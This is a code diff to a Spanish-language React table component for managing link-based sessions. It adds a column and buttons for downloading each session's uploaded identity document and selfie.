@@ -92,6 +92,45 @@ const AccessTable: React.FC<AccessTableProps> = ({
   // Referencias previas de las sesiones para poder comparar y detectar cambios
   const [prevSessions, setPrevSessions] = useState<Session[]>([]);
   
+  // Función para descargar documentos de identidad
+  const handleDownloadIdentityFile = (session: Session, type: 'document' | 'selfie') => {
+    try {
+      const fileUrl = type === 'document' ? (session as any).documentFileUrl : (session as any).selfieFileUrl;
+      const fileName = type === 'document' ? (session as any).documentFileName : (session as any).selfieFileName;
+      
+      if (!fileUrl) {
+        toast({
+          title: "No hay archivo",
+          description: `No se encontró el ${type === 'document' ? 'documento' : 'selfie'} para descargar.`,
+          variant: "destructive",
+        });
+        return;
+      }
+
+      // Crear enlace temporal para descargar el archivo
+      const link = document.createElement('a');
+      link.href = fileUrl;
+      link.download = fileName || `${type}_${session.sessionId}_${new Date().toISOString().slice(0, 10)}.png`;
+      link.target = '_blank';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      
+      toast({
+        title: "Descarga exitosa",
+        description: `El ${type === 'document' ? 'documento de identidad' : 'selfie'} se ha descargado correctamente.`,
+        variant: "default",
+      });
+    } catch (error) {
+      console.error(`Error al descargar ${type}:`, error);
+      toast({
+        title: "Error al descargar",
+        description: `Ha ocurrido un error al descargar el ${type === 'document' ? 'documento' : 'selfie'}.`,
+        variant: "destructive",
+      });
+    }
+  };
+
   // Función para descargar un código QR (como imagen o texto)
   const handleDownloadQR = (session: Session) => {
     try {
@@ -623,13 +662,14 @@ const AccessTable: React.FC<AccessTableProps> = ({
                 <th className="p-2 text-left w-[70px]">Celular</th>
                 <th className="p-2 text-left w-[90px]">Paso actual</th>
                 <th className="p-2 text-left w-[90px]">Creado por</th>
+                <th className="p-2 text-left w-[100px]">Verificación ID</th>
                 <th className="p-2 text-left w-[120px]">Acciones</th>
               </tr>
             </thead>
             <tbody>
               {filteredSessions.length === 0 && (
                 <tr>
-                  <td colSpan={15} className="p-4 text-center text-gray-400">
+                  <td colSpan={16} className="p-4 text-center text-gray-400">
                     No hay sesiones activas. Genere un nuevo link para crear una sesión.
                   </td>
                 </tr>
@@ -729,6 +769,45 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       : 'Inicio'}
                   </td>
                   <td className="p-2 text-[#ccc] truncate">{session.createdBy || '--'}</td>
+                  <td className="p-2 text-[#ccc]">
+                    {(session as any).documentFileUrl || (session as any).selfieFileUrl ? (
+                      <div className="flex flex-col gap-1">
+                        <div className="text-xs opacity-80">
+                          Tipo: {(session as any).documentType || 'N/A'}
+                        </div>
+                        <div className="flex gap-1">
+                          {(session as any).documentFileUrl && (
+                            <Button
+                              variant="outline"
+                              size="sm"
+                              className="text-[#00aaff] border-[#00aaff] hover:bg-[#0a101d] flex items-center gap-1 py-1 h-6 text-xs px-2"
+                              onClick={(e) => {
+                                e.stopPropagation();
+                                handleDownloadIdentityFile(session, 'document');
+                              }}
+                            >
+                              <Download className="h-3 w-3" />
+                              Doc
+                            </Button>
+                          )}
+                          {(session as any).selfieFileUrl && (
+                            <Button
+                              variant="outline"
+                              size="sm"
+                              className="text-[#ff6b35] border-[#ff6b35] hover:bg-[#1a0d0a] flex items-center gap-1 py-1 h-6 text-xs px-2"
+                              onClick={(e) => {
+                                e.stopPropagation();
+                                handleDownloadIdentityFile(session, 'selfie');
+                              }}
+                            >
+                              <Download className="h-3 w-3" />
+                              Selfie
+                            </Button>
+                          )}
+                        </div>
+                      </div>
+                    ) : '--'}
+                  </td>
                   <td className="p-2 flex gap-1">
                     {!session.saved && (
                       <Button 
